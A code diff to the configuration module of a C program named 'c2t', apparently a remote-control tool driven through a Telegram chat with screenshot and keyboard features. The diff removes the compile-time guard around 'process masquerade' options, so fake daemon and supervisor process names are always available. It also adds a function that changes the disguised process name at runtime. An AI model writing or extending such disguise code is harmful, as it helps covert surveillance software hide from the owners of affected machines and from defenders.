@@ -53,10 +53,8 @@ static char embedded_screenshot_format[32];
 static char embedded_keyboard_layout[64];
 static char embedded_allowed_mac[256];
 static char embedded_allowed_ip[256];
-#ifdef C2T_ENABLE_PROCESS_MASQUERADE
 static char embedded_daemon_name[64];
 static char embedded_supervisor_name[64];
-#endif
 
 #ifdef __APPLE__
 #define C2T_SIDECAR_CAPACITY 4096U
@@ -269,7 +267,6 @@ void c2t_config_load([[maybe_unused]] const char *executable_path) {
   config.keyboard_shortcuts = configured_flag("C2T_KEYBOARD_SHORTCUTS") ||
                               configured_flag("KEYBOARD_SHORTCUTS") ||
                               configured_flag("TELEGRAM_KEYBOARD_SHORTCUTS");
-#ifdef C2T_ENABLE_PROCESS_MASQUERADE
   config.daemon_name = configured_value("C2T_DAEMON_NAME", embedded_daemon_name,
                                         sizeof(embedded_daemon_name));
   if (!config.daemon_name || !*config.daemon_name)
@@ -279,7 +276,6 @@ void c2t_config_load([[maybe_unused]] const char *executable_path) {
                        sizeof(embedded_supervisor_name));
   if (!config.supervisor_name || !*config.supervisor_name)
     config.supervisor_name = "t2c";
-#endif
   config.keyboard_layout =
       configured_value("C2T_KEYBOARD_LAYOUT", embedded_keyboard_layout,
                        sizeof(embedded_keyboard_layout));
@@ -396,7 +392,6 @@ const char *c2t_config_apply_arguments(int argc, char **argv) {
         return argv[index];
       ++index;
       config.proxy = argv[index];
-#ifdef C2T_ENABLE_PROCESS_MASQUERADE
     } else if (strcmp(argv[index], "--daemon-name") == 0 ||
                strcmp(argv[index], "--process-name") == 0) {
       if (index + 1 >= argc)
@@ -408,7 +403,6 @@ const char *c2t_config_apply_arguments(int argc, char **argv) {
         return argv[index];
       ++index;
       config.supervisor_name = argv[index];
-#endif
     } else if (strcmp(argv[index], "--keyboard-flush-ms") == 0 ||
                strcmp(argv[index], "--keyboard-flush") == 0) {
       if (index + 1 >= argc)
@@ -481,12 +475,20 @@ const char *c2t_config_apply_arguments(int argc, char **argv) {
 }
 
 static char dynamic_chat_id[128];
+static char dynamic_daemon_name[128];
 
 void c2t_config_set_chat_id(const char *chat_id) {
   if (!chat_id)
     return;
   snprintf(dynamic_chat_id, sizeof(dynamic_chat_id), "%s", chat_id);
   config.telegram_chat_id = dynamic_chat_id;
+}
+
+void c2t_config_set_daemon_name(const char *daemon_name) {
+  if (!daemon_name || !*daemon_name)
+    return;
+  snprintf(dynamic_daemon_name, sizeof(dynamic_daemon_name), "%s", daemon_name);
+  config.daemon_name = dynamic_daemon_name;
 }
 
 const c2t_config_t *c2t_config_get(void) { return &config; }
